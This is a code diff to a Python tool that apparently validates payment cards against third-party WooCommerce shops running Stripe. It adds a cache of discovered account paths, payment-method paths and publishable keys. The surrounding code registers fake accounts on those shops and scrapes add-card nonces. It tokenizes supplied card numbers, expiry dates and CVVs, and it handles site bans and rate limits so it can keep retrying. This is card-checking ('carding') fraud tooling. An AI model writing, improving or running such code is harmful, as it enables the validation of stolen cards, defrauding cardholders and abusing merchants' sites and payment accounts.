@@ -1,6 +1,7 @@
 import re
 import logging
 import time
+import threading
 from urllib.parse import urlparse
 from config import get_proxy_dict, get_random_ua, get_gate_setting, fake, WC_ACCOUNT_PATHS, get_next_site, STRIPE_WC_SITE_POOL
 from stripe_common import (
@@ -15,6 +16,37 @@ from stripe_common import (
 logger = logging.getLogger(__name__)
 
 _rl = get_auth_rate_limiter()
+
+# ── path/key cache: skip probe loops on repeat checks of the same site ──────
+_auth_path_cache: dict = {}
+_auth_cache_lock = threading.Lock()
+_PATH_CACHE_TTL = 3600  # 1 hour
+
+
+def _auth_cache_get(site_url):
+    with _auth_cache_lock:
+        e = _auth_path_cache.get(site_url)
+        if e and time.time() - e[3] < _PATH_CACHE_TTL:
+            return e[0], e[1], e[2]  # acct_path, pm_path, pub_key
+        return None
+
+
+def _auth_cache_set(site_url, acct_path, pm_path, pub_key):
+    with _auth_cache_lock:
+        _auth_path_cache[site_url] = (acct_path, pm_path, pub_key, time.time())
+
+
+def _auth_cache_del(site_url):
+    with _auth_cache_lock:
+        _auth_path_cache.pop(site_url, None)
+
+
+def invalidate_auth_cache(site_url=None):
+    with _auth_cache_lock:
+        if site_url:
+            _auth_path_cache.pop(site_url, None)
+        else:
+            _auth_path_cache.clear()
 
 
 def check_stripe_auth(cc, mm, yy, cvv, site_url=None, pub_key=None):
@@ -80,6 +112,17 @@ def _do_auth_check(s, cc, mm, yy, cvv, site_url, pub_key):
     else:
         account_paths = list(WC_ACCOUNT_PATHS)
 
+    # Use cached paths to skip multi-path probe on repeat checks of the same site
+    _pc = _auth_cache_get(site_url)
+    if _pc:
+        _c_acct, _c_pm, _c_pk = _pc
+        if _c_acct and _c_acct not in account_paths:
+            account_paths = [_c_acct] + account_paths
+        if not pub_key and _c_pk:
+            pub_key = _c_pk
+    else:
+        _c_acct, _c_pm, _c_pk = None, None, None
+
     _rl.wait_if_needed()
     resp = None
     acct_path = '/my-account/'
@@ -101,6 +144,7 @@ def _do_auth_check(s, cc, mm, yy, cvv, site_url, pub_key):
             return {**error_result(cc, mm, yy, cvv, "Rate Limited by site", gate_name), "_retry": True}
         elif status_code == 403:
             _rl.record_ban(180)
+            _auth_cache_del(site_url)
             return {**error_result(cc, mm, yy, cvv, "Blocked by site (403)", gate_name), "_retry": True}
         return {**error_result(cc, mm, yy, cvv, f"Cannot reach site account page", gate_name), "_retry": True}
 
@@ -153,12 +197,12 @@ def _do_auth_check(s, cc, mm, yy, cvv, site_url, pub_key):
 
     logger.info("Stripe Auth: registered account")
 
-    pm_paths = [
-        f'{acct_path}add-payment-method/' if not acct_path.endswith('add-payment-method/') else acct_path,
-        '/my-account-2/add-payment-method/',
-        '/my-account/add-payment-method/',
-        '/account/add-payment-method/',
-    ]
+    _pm_default = f'{acct_path}add-payment-method/' if not acct_path.endswith('add-payment-method/') else acct_path
+    _pm_seen: list = []
+    for _p in [_c_pm, _pm_default, '/my-account-2/add-payment-method/', '/my-account/add-payment-method/', '/account/add-payment-method/']:
+        if _p and _p not in _pm_seen:
+            _pm_seen.append(_p)
+    pm_paths = _pm_seen
     pm_resp = None
     for pm_path in pm_paths:
         try:
@@ -197,6 +241,7 @@ def _do_auth_check(s, cc, mm, yy, cvv, site_url, pub_key):
                 wc_pm_nonce = wc_pm_match2.group(1)
 
     if not add_nonce and not wc_pm_nonce:
+        _auth_cache_del(site_url)  # cached pm_path may be stale
         return {**error_result(cc, mm, yy, cvv, "Add card nonce not found", gate_name), "_retry": True}
 
     page_pk = extract_stripe_key(pm_html)
@@ -205,6 +250,8 @@ def _do_auth_check(s, cc, mm, yy, cvv, site_url, pub_key):
         return error_result(cc, mm, yy, cvv, "No Stripe key found", gate_name)
 
     logger.info("Stripe Auth: gate ready")
+    if not _c_acct:  # first successful discovery — cache for future checks
+        _auth_cache_set(site_url, acct_path, pm_path, final_key)
 
     pm_id, pm_err, card_brand = tokenize_card(cc, mm, yy, cvv, final_key, site_url, _rl)
 
